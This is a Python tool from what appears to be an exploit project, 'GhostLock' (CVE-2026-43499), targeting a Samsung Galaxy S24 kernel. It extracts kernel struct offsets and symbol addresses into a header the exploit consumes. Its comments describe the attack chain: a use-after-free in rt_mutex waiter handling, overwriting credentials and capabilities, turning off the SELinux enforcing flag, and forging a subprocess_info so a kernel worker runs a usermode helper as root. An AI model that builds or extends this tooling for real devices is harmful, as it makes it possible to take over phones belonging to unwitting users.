#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
extract_offsets.py -- structure-offset / symbol extractor for the
GhostLock (CVE-2026-43499) port to Samsung Galaxy S24 SM-S921B (e1s).

Target kernel : 6.1.162-android14-11 (arm64, 4 KiB pages)
Build         : CP2A.260605.016.S921BXXUHEZIF

WHAT IT DOES
  Drives `pahole` over an ELF `vmlinux` (or a raw BTF blob pulled from the
  running device) and prints every member offset the exploit needs, as JSON
  and/or as a populated `target.h`.

  It never guesses. A member that cannot be resolved is reported as MISSING
  and left at 0 in the header, where target.h's compile-time guard rejects it.

SOURCE PRIORITY (--format auto)
  btf   -> pahole -F btf     raw BTF file (/sys/kernel/btf/vmlinux) or .BTF
  dwarf -> pahole -F dwarf   self-built vmlinux from the Samsung OSS tarball
  ctf   -> pahole -F ctf     (rare on arm64, kept as a last resort)

EXAMPLES
  # preferred: BTF blob pulled off the running device with root
  ./extract_offsets.py --vmlinux vmlinux.btf --format btf \
      --json offsets.json --header ../include/target.h

  # self-built debug vmlinux from the Samsung OSS kernel tarball
  ./extract_offsets.py --vmlinux vmlinux --format dwarf --json offsets.json

  # additionally dump kallsyms out of a vmlinux that still has .symtab
  ./extract_offsets.py --vmlinux vmlinux --symbols --map System.map

EXIT CODES
  0  everything requested was resolved
  2  bad invocation / tool missing
  3  pahole could not read any of the requested debug formats
  4  one or more members unresolved (partial output still written)
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys

# --------------------------------------------------------------------------
# What we need, and why. Members not present in the target kernel are simply
# reported MISSING -- several of these are config-dependent (LOCKDEP,
# DEBUG_CREDENTIALS, PREEMPT_RT) and that is exactly why we extract instead
# of hardcoding.
# --------------------------------------------------------------------------
WANTED = {
    "task_struct": [
        "thread_info", "cred", "real_cred", "comm", "pid", "tgid",
        "tasks", "files", "nsproxy", "cred_guard_mutex",
    ],
    "cred": [
        "usage", "subscribers", "uid", "gid", "euid", "egid",
        "suid", "sgid", "fsuid", "fsgid", "securebits",
        "cap_inheritable", "cap_permitted", "cap_effective",
        "cap_bset", "cap_ambient", "user", "user_ns", "group_info",
        "security", "rcu",
    ],
    "pipe_inode_info": [
        "mutex", "rd_wait", "wr_wait", "head", "tail", "max_usage",
        "ring_size", "nr_accounted", "readers", "writers", "files",
        "r_counter", "w_counter", "tmp_page", "bufs", "user",
    ],
    # NOTE: pipe_buffer->ops is a `const struct pipe_buf_operations *`,
    # NOT a file_operations. Both are extracted because the port uses the
    # pipe_buf_operations path; file_operations is kept for the file-based
    # hijack variants of the reference PoC.
    "pipe_buffer": ["page", "offset", "len", "ops", "flags", "private"],
    "pipe_buf_operations": ["confirm", "release", "try_steal", "get"],
    "file_operations": [
        "owner", "llseek", "read", "write", "read_iter", "write_iter",
        "iopoll", "iterate_shared", "poll", "unlocked_ioctl", "compat_ioctl",
        "mmap", "mmap_supported_flags", "open", "flush", "release",
        "splice_read", "splice_write", "fasync", "lock",
    ],
    # UMH endgame: we fabricate a subprocess_info and let a real worker
    # thread call call_usermodehelper_exec() on it.
    "subprocess_info": [
        "work", "complete", "path", "argv", "envp", "wait", "retval",
        "init", "cleanup", "data",
    ],
    # work_struct.func is the kCFI-checked indirect call target we need
    # the offset of (subprocess_info.work is at 0, so OFF_SUB_WORK_FUNC is
    # the interesting number).
    "work_struct": ["data", "entry", "func"],
    # rtmutex objects touched by the UAF window in remove_waiter()
    "rt_mutex_waiter": [
        "tree_entry", "pi_tree_entry", "task", "lock", "prio", "deadline",
        "ww_ctx",
    ],
    "rt_mutex_base": ["wait_lock", "waiters", "owner"],
    # 6.1 has no exported `selinux_enforcing` symbol: the flag lives at
    # selinux_state.enforcing, so the offset is what the exploit needs.
    "selinux_state": ["enforcing"],
}

# Members that exist on some kernel versions but are deliberately absent on
# others. They are extracted when present and never counted as unresolved:
#   task_struct.cred_guard_mutex  -> renamed exec_update_lock in 6.9+
#   cred.subscribers             -> only present with CONFIG_DEBUG_CREDENTIALS
OPTIONAL_MEMBERS = {
    ("task_struct", "cred_guard_mutex"),
    ("cred", "subscribers"),
}

# Symbols we will need from Phase 2 onwards. Filled from .symtab when the
# vmlinux still has one; otherwise Phase 2 gets them from the KASLR leak.
WANTED_SYMS = [
    "_text", "_stext", "init_task", "init_cred", "init_nsproxy",
    "anon_pipe_buf_ops", "page_cache_pipe_buf_ops", "modprobe_path",
    "call_usermodehelper_exec", "call_usermodehelper_setup",
    "call_usermodehelper_exec_work", "commit_creds", "prepare_kernel_cred",
    "selinux_state", "selinux_enforcing", "kptr_restrict",
    "kallsyms_lookup_name", "init_mm", "swapper_pg_dir",
]

# --------------------------------------------------------------------------
# pahole output parsing
#
# `pahole -C <t> --hex` emits one member per line followed by a
# `/* <offset> <size> */` comment. Anonymous unions/structs are emitted as
# nested braces whose members already carry absolute offsets, so we simply
# flatten them by tracking brace depth.
# --------------------------------------------------------------------------
MEMBER_RE = re.compile(
    r"^(?P<decl>.*?);\s*/\*\s*"
    r"(?P<off>0x[0-9a-fA-F]+|\d+)"
    r"(?::(?P<bit>0x[0-9a-fA-F]+|\d+))?"
    r"\s+(?P<size>0x[0-9a-fA-F]+|\d+)\s*\*/"
)
SIZE_RE = re.compile(r"/\*\s*size:\s*(\d+)")
IDENT_RE = re.compile(r"([A-Za-z_][A-Za-z_0-9]*)\s*(?:\[[^\]]*\])?\s*$")
# function-pointer members: "void (*release)(struct pipe_inode_info *, ...)"
# and arrays of them: "void (*tab[4])(void)". The plain IDENT_RE cannot see
# these because the declaration ends with ')'.
FNP_RE = re.compile(r"\(\s*\*\s*([A-Za-z_][A-Za-z_0-9]*)\s*(?:\[[^\]]*\])?\s*\)")


def _to_int(tok):
    return int(tok, 16) if tok.lower().startswith("0x") else int(tok)


def parse_pahole(text):
    """Return (members: {name: byte_offset}, size: int|None, bitfields: set)."""
    members, bitfields, size = {}, set(), None
    depth = 0
    for raw in text.splitlines():
        line = raw.rstrip()
        if not line:
            continue

        m = SIZE_RE.search(line)
        if m and size is None:
            size = int(m.group(1))

        stripped = line.strip()
        # closing brace of a nested anon type: "};  /* off size */"
        if stripped.startswith("}"):
            depth = max(0, depth - 1)
            continue
        # opening brace of a nested anon type: "union {", "struct {"
        if re.match(r"^(struct|union)\s*\{$", stripped) or \
           re.match(r"^(struct|union)\s+\w*\s*\{$", stripped):
            depth += 1
            continue

        m = MEMBER_RE.match(line)
        if not m:
            continue
        decl = m.group("decl").strip()
        if not decl or decl.startswith("/*") or decl.startswith("//"):
            continue
        nm = FNP_RE.search(decl) or IDENT_RE.search(decl)
        if not nm:
            continue
        name = nm.group(1)
        off = _to_int(m.group("off"))
        # In nested anon scopes the printed offset is already absolute in
        # pahole's output; keep the first (outermost) binding for a name.
        if name not in members:
            members[name] = off
        if m.group("bit") is not None:
            bitfields.add(name)
    return members, size, bitfields


def run_pahole(pahole, fmt, typename, path):
    cmd = [pahole, "-F", fmt, "-C", typename, "--hex", path]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    except (OSError, subprocess.TimeoutExpired) as e:
        return None, f"{fmt}: {e}"
    if p.returncode != 0 or ("struct " not in p.stdout and
                             "union " not in p.stdout):
        first = (p.stderr or p.stdout).strip().splitlines()
        return None, f"{fmt}: {first[0] if first else 'no type info'}"
    return p.stdout, None


def collect(pahole, vmlinux, fmts):
    """Merge results across debug formats until every wanted type resolves.

    Each pahole invocation re-parses the whole image, so this is only slow in
    the pathological case where types live in different formats. Normally the
    first working format answers everything.
    """
    best, used, notes = {}, [], []
    for fmt in fmts:
        todo = [t for t in WANTED if t not in best]
        if not todo:
            break
        probe, err = run_pahole(pahole, fmt, "task_struct", vmlinux)
        if probe is None:
            notes.append(err)
            continue
        used.append(fmt)
        for typename in todo:
            out, err = run_pahole(pahole, fmt, typename, vmlinux)
            if out is None:
                notes.append(f"{typename}: {err}")
                continue
            members, size, bits = parse_pahole(out)
            if members:
                best[typename] = {
                    "size": size,
                    "members": members,
                    "bitfields": sorted(bits),
                }
    return best, "+".join(used) or None, notes


# --------------------------------------------------------------------------
# Optional symbol table dump (needs pyelftools; silently skipped otherwise)
# --------------------------------------------------------------------------
def dump_symbols(vmlinux, map_path):
    try:
        from elftools.elf.elffile import ELFFile
    except ImportError:
        print("[!] pyelftools not installed: pip install pyelftools",
              file=sys.stderr)
        return None
    found = {}
    with open(vmlinux, "rb") as fh:
        elf = ELFFile(fh)
        symtab = elf.get_section_by_name(".symtab")
        if symtab is None:
            print("[!] no .symtab -- kernel is stripped; use "
                  "`vmlinux-to-elf` or the runtime BTF/KASLR leak",
                  file=sys.stderr)
            return {}
        rows = []
        for sym in symtab.iter_symbols():
            if sym["st_info"]["type"] not in ("STT_FUNC", "STT_OBJECT"):
                continue
            if sym["st_shndx"] == "SHN_UNDEF" or sym["st_value"] == 0:
                continue
            rows.append((sym["st_value"], sym.name))
            if sym.name in WANTED_SYMS:
                found[sym.name] = sym["st_value"]
        rows.sort()
        if map_path:
            with open(map_path, "w") as out:
                for addr, name in rows:
                    out.write(f"{addr:016x} {name}\n")
            print(f"[+] wrote {len(rows)} symbols to {map_path}",
                  file=sys.stderr)
    for name in WANTED_SYMS:
        if name not in found:
            print(f"[!] symbol not found: {name}", file=sys.stderr)
    return found


# --------------------------------------------------------------------------
# target.h rendering
# --------------------------------------------------------------------------
HDR_HEAD = """\
/*
 * target.h -- offsets for Samsung Galaxy S24 (SM-S921B / e1s)
 * Kernel  : 6.1.162-android14-11 (arm64, 4 KiB pages)
 * Build   : CP2A.260605.016.S921BXXUHEZIF
 *
 * Generated by tools/extract_offsets.py -- do not hand-edit the values.
 * A value of 0x0 means "not extracted yet"; TARGET_OFFSETS_POPULATED stays 0
 * and the guard below stops the build so a zero offset can never be used
 * silently.
 */
#ifndef GHOSTLOCK_TARGET_H
#define GHOSTLOCK_TARGET_H

#include <stdint.h>

#define TARGET_DEVICE   "Samsung Galaxy S24 (SM-S921B, e1s, Exynos 2400)"
#define TARGET_KERNEL   "6.1.162-android14-11"
#define TARGET_BUILD    "CP2A.260605.016.S921BXXUHEZIF"
#define TARGET_PAGE_SIZE 0x1000
#define TARGET_VA_BITS  39

/* ---- typed field access, so no struct ABI is ever assumed ---------- */
#define GL8(base, off)   (*(volatile uint64_t *)((uint8_t *)(base) + (off)))
#define GL4(base, off)   (*(volatile uint32_t *)((uint8_t *)(base) + (off)))
#define GL2(base, off)   (*(volatile uint16_t *)((uint8_t *)(base) + (off)))
#define GL1(base, off)   (*(volatile uint8_t  *)((uint8_t *)(base) + (off)))
"""

HDR_TAIL = """
/* ---- sanity checks -------------------------------------------------
 * Structural invariants of the 6.1 arm64 layout. If any of these fail the
 * extracted header does not describe the kernel the exploit will run on
 * (wrong image, wrong config, or a hand-edited macro).
 */
static inline int gl_offsets_look_sane(void)
{
	if (OFF_TASK_REAL_CRED + 8 != OFF_TASK_CRED)          return 0;
	if (OFF_CRED_EUID != OFF_CRED_UID + 0x10)             return 0;
	if (OFF_CRED_EGID != OFF_CRED_GID + 0x10)             return 0;
	if (OFF_CRED_FSUID != OFF_CRED_EUID + 8)              return 0;
	if (OFF_PB_LEN != OFF_PB_OFFSET + 4)                  return 0;
	if (SZ_PIPE_BUFFER != 0x28)                           return 0;
	if (SZ_PIPE_BUF_OPERATIONS != 0x20)                   return 0;
	if (OFF_PIPE_BUFS & 7)                                return 0;
	if (OFF_WORK_FUNC != 0x18)                            return 0;
	if (OFF_SUB_WORK != 0)                                return 0;
	if (SZ_SUBPROCESS_INFO != 0x70)                       return 0;
	if (SZ_WORK_STRUCT != 0x30)                           return 0;
	return 1;
}

/* ---- compile-time guard ------------------------------------------- */
#if TARGET_OFFSETS_POPULATED == 0 && !defined(TARGET_ALLOW_UNPOPULATED)
# error "target.h offsets are not populated: run tools/extract_offsets.py --header include/target.h"
#endif

#endif /* GHOSTLOCK_TARGET_H */
"""

# macro name -> (struct, member)
MACROS = {
    # task_struct
    "OFF_TASK_CRED":        ("task_struct", "cred"),
    "OFF_TASK_REAL_CRED":   ("task_struct", "real_cred"),
    "OFF_TASK_COMM":        ("task_struct", "comm"),
    "OFF_TASK_PID":         ("task_struct", "pid"),
    "OFF_TASK_TGID":        ("task_struct", "tgid"),
    "OFF_TASK_TASKS":       ("task_struct", "tasks"),
    "OFF_TASK_FILES":       ("task_struct", "files"),
    "OFF_TASK_NSPROXY":     ("task_struct", "nsproxy"),
    # selinux
    "OFF_SELINUX_ENFORCING": ("selinux_state", "enforcing"),
    # cred
    "OFF_CRED_USAGE":       ("cred", "usage"),
    "OFF_CRED_UID":         ("cred", "uid"),
    "OFF_CRED_GID":         ("cred", "gid"),
    "OFF_CRED_EUID":        ("cred", "euid"),
    "OFF_CRED_EGID":        ("cred", "egid"),
    "OFF_CRED_SUID":        ("cred", "suid"),
    "OFF_CRED_SGID":        ("cred", "sgid"),
    "OFF_CRED_FSUID":       ("cred", "fsuid"),
    "OFF_CRED_FSGID":       ("cred", "fsgid"),
    "OFF_CRED_SECUREBITS":  ("cred", "securebits"),
    "OFF_CRED_CAP_INH":     ("cred", "cap_inheritable"),
    "OFF_CRED_CAP_PERM":    ("cred", "cap_permitted"),
    "OFF_CRED_CAP_EFF":     ("cred", "cap_effective"),
    "OFF_CRED_CAP_BSET":    ("cred", "cap_bset"),
    "OFF_CRED_CAP_AMB":     ("cred", "cap_ambient"),
    "OFF_CRED_USER":        ("cred", "user"),
    "OFF_CRED_USER_NS":     ("cred", "user_ns"),
    "OFF_CRED_SECURITY":    ("cred", "security"),
    # pipe
    "OFF_PIPE_BUFS":        ("pipe_inode_info", "bufs"),
    "OFF_PIPE_HEAD":        ("pipe_inode_info", "head"),
    "OFF_PIPE_TAIL":        ("pipe_inode_info", "tail"),
    "OFF_PIPE_RING_SIZE":   ("pipe_inode_info", "ring_size"),
    "OFF_PIPE_MAX_USAGE":   ("pipe_inode_info", "max_usage"),
    "OFF_PIPE_MUTEX":       ("pipe_inode_info", "mutex"),
    "OFF_PIPE_RD_WAIT":     ("pipe_inode_info", "rd_wait"),
    # pipe_buffer
    "OFF_PB_PAGE":          ("pipe_buffer", "page"),
    "OFF_PB_OFFSET":        ("pipe_buffer", "offset"),
    "OFF_PB_LEN":           ("pipe_buffer", "len"),
    "OFF_PB_OPS":           ("pipe_buffer", "ops"),
    "OFF_PB_FLAGS":         ("pipe_buffer", "flags"),
    "OFF_PB_PRIVATE":       ("pipe_buffer", "private"),
    # pipe_buf_operations (the real target behind pipe_buffer->ops)
    "OFF_PBO_CONFIRM":      ("pipe_buf_operations", "confirm"),
    "OFF_PBO_RELEASE":      ("pipe_buf_operations", "release"),
    "OFF_PBO_TRY_STEAL":    ("pipe_buf_operations", "try_steal"),
    "OFF_PBO_GET":          ("pipe_buf_operations", "get"),
    # file_operations
    "OFF_FOP_OWNER":        ("file_operations", "owner"),
    "OFF_FOP_LLSEEK":       ("file_operations", "llseek"),
    "OFF_FOP_READ":         ("file_operations", "read"),
    "OFF_FOP_WRITE":        ("file_operations", "write"),
    "OFF_FOP_READ_ITER":    ("file_operations", "read_iter"),
    "OFF_FOP_WRITE_ITER":   ("file_operations", "write_iter"),
    "OFF_FOP_POLL":         ("file_operations", "poll"),
    "OFF_FOP_UNLOCKED_IOCTL": ("file_operations", "unlocked_ioctl"),
    "OFF_FOP_COMPAT_IOCTL": ("file_operations", "compat_ioctl"),
    "OFF_FOP_MMAP":         ("file_operations", "mmap"),
    "OFF_FOP_OPEN":         ("file_operations", "open"),
    "OFF_FOP_RELEASE":      ("file_operations", "release"),
    "OFF_FOP_SPLICE_READ":  ("file_operations", "splice_read"),
    "OFF_FOP_SPLICE_WRITE": ("file_operations", "splice_write"),
    # subprocess_info / work_struct (UMH endgame)
    "OFF_SUB_WORK":         ("subprocess_info", "work"),
    "OFF_SUB_COMPLETE":     ("subprocess_info", "complete"),
    "OFF_SUB_PATH":         ("subprocess_info", "path"),
    "OFF_SUB_ARGV":         ("subprocess_info", "argv"),
    "OFF_SUB_ENVP":         ("subprocess_info", "envp"),
    "OFF_SUB_WAIT":         ("subprocess_info", "wait"),
    "OFF_SUB_RETVAL":       ("subprocess_info", "retval"),
    "OFF_SUB_INIT":         ("subprocess_info", "init"),
    "OFF_SUB_CLEANUP":      ("subprocess_info", "cleanup"),
    "OFF_SUB_DATA":         ("subprocess_info", "data"),
    "OFF_WORK_DATA":        ("work_struct", "data"),
    "OFF_WORK_ENTRY":       ("work_struct", "entry"),
    "OFF_WORK_FUNC":        ("work_struct", "func"),
    # rtmutex (the bug surface)
    "OFF_RTMW_TREE_ENTRY":  ("rt_mutex_waiter", "tree_entry"),
    "OFF_RTMW_PI_ENTRY":    ("rt_mutex_waiter", "pi_tree_entry"),
    "OFF_RTMW_TASK":        ("rt_mutex_waiter", "task"),
    "OFF_RTMW_LOCK":        ("rt_mutex_waiter", "lock"),
    "OFF_RTMW_PRIO":        ("rt_mutex_waiter", "prio"),
    "OFF_RTMW_DEADLINE":    ("rt_mutex_waiter", "deadline"),
}

SYM_MACROS = [
    "init_task", "init_cred", "init_nsproxy", "anon_pipe_buf_ops",
    "modprobe_path", "call_usermodehelper_exec", "call_usermodehelper_setup",
    "commit_creds", "prepare_kernel_cred", "selinux_state",
]


def render_header(data, symbols):
    out = [HDR_HEAD]
    out.append("/* ---------------- struct offsets --------------------------- */\n")
    populated = 0
    total = 0
    for macro, (stype, member) in MACROS.items():
        total += 1
        val = None
        if stype in data:
            val = data[stype]["members"].get(member)
        if val is None:
            out.append(f"#define {macro:<24} 0x0  /* TODO: EXTRACT "
                       f"({stype}.{member} not found) */\n")
        else:
            populated += 1
            out.append(f"#define {macro:<24} 0x{val:x}\n")

    out.append("\n/* ---------------- struct sizes ----------------------------- */\n")
    for stype in WANTED:
        if stype in data and data[stype]["size"]:
            out.append(f"#define SZ_{stype.upper():<26} 0x{data[stype]['size']:x}\n")

    out.append("\n/* ---------------- kernel symbols --------------------------- */\n")
    out.append("/* Filled in Phase 2 from the KASLR leak, not from the image:    */\n")
    out.append("/* these are link-time values and are ASLR-shifted at runtime.   */\n")
    for name in SYM_MACROS:
        macro = "KSYM_" + name.upper()
        v = (symbols or {}).get(name)
        if v is None:
            out.append(f"#define {macro:<24} 0x0ULL  /* TODO: EXTRACT */\n")
        else:
            out.append(f"#define {macro:<24} 0x{v:x}ULL\n")

    out.append(f"\n#define TARGET_OFFSETS_POPULATED "
               f"{1 if populated == total else 0}\n")
    out.append(HDR_TAIL)
    return "".join(out), populated, total


# --------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--vmlinux",
                    help="ELF vmlinux or raw BTF blob (required unless --selftest)")
    ap.add_argument("--pahole", default=shutil.which("pahole") or "pahole")
    ap.add_argument("--format", default="auto",
                    choices=["auto", "btf", "dwarf", "ctf"])
    ap.add_argument("--json", metavar="PATH")
    ap.add_argument("--header", metavar="PATH")
    ap.add_argument("--symbols", action="store_true")
    ap.add_argument("--map", metavar="PATH", help="write System.map-style dump")
    ap.add_argument("--selftest", action="store_true",
                    help="parse a built-in pahole sample and exit")
    args = ap.parse_args()

    if not args.selftest and not args.vmlinux:
        ap.error("--vmlinux is required unless --selftest is used")

    if args.selftest:
        sample = """
struct pipe_inode_info {
	unsigned int               head;                 /*  0x20   0x4 */
	union {
		struct {
			unsigned int lo;                 /*  0x28   0x4 */
		};
	};
	struct pipe_buffer *       bufs;                 /*  0x30   0x8 */
	/* size: 56, cachelines: 1, members: 6 */
};
"""
        members, size, bits = parse_pahole(sample)
        assert members["head"] == 0x20, members
        assert members["lo"] == 0x28, members
        assert members["bufs"] == 0x30, members
        assert size == 56, size
        print("[+] parser selftest OK")
        return 0

    if not os.path.exists(args.vmlinux):
        print(f"[-] no such file: {args.vmlinux}", file=sys.stderr)
        return 2
    if not shutil.which(args.pahole) and not os.path.exists(args.pahole):
        print("[-] pahole not found (apt install dwarves)", file=sys.stderr)
        return 2

    fmts = ["btf", "dwarf", "ctf"] if args.format == "auto" else [args.format]
    data, used, notes = collect(args.pahole, args.vmlinux, fmts)
    if not data:
        print("[-] pahole could not read any debug info from "
              f"{args.vmlinux}", file=sys.stderr)
        for n in notes:
            print(f"    {n}", file=sys.stderr)
        return 3
    print(f"[+] debug format: {used}", file=sys.stderr)

    # report
    missing = 0
    for stype in WANTED:
        if stype not in data:
            print(f"MISSING type {stype}")
            missing += len(WANTED[stype])
            continue
        print(f"\nstruct {stype}  (size 0x{data[stype]['size'] or 0:x})")
        for member in WANTED[stype]:
            off = data[stype]["members"].get(member)
            if off is None:
                tag = ("  (optional, not on this kernel)"
                       if (stype, member) in OPTIONAL_MEMBERS else "")
                print(f"  {member:<22} MISSING{tag}")
                if (stype, member) not in OPTIONAL_MEMBERS:
                    missing += 1
            else:
                bf = " [bitfield]" if member in data[stype]["bitfields"] else ""
                print(f"  {member:<22} 0x{off:04x}{bf}")

    symbols = None
    if args.symbols or args.map:
        symbols = dump_symbols(args.vmlinux, args.map)
        if symbols is None:
            print("[!] symbol stage failed -- install pyelftools "
                  "(pip install pyelftools) or drop --symbols/--map",
                  file=sys.stderr)
            return 2
        if symbols:
            print("\nsymbols")
            for name in WANTED_SYMS:
                if name in symbols:
                    print(f"  {name:<28} 0x{symbols[name]:016x}")

    if args.json:
        doc = {"kernel": "6.1.162-android14-11",
               "build": "CP2A.260605.016.S921BXXUHEZIF",
               "format": used, "structs": data, "symbols": symbols or {}}
        with open(args.json, "w") as fh:
            json.dump(doc, fh, indent=2)
        print(f"\n[+] wrote {args.json}", file=sys.stderr)

    if args.header:
        text, pop, total = render_header(data, symbols)
        with open(args.header, "w") as fh:
            fh.write(text)
        print(f"[+] wrote {args.header} ({pop}/{total} offsets populated)",
              file=sys.stderr)

    if missing:
        print(f"\n[!] {missing} member(s) unresolved", file=sys.stderr)
        return 4
    print("\n[+] all members resolved", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
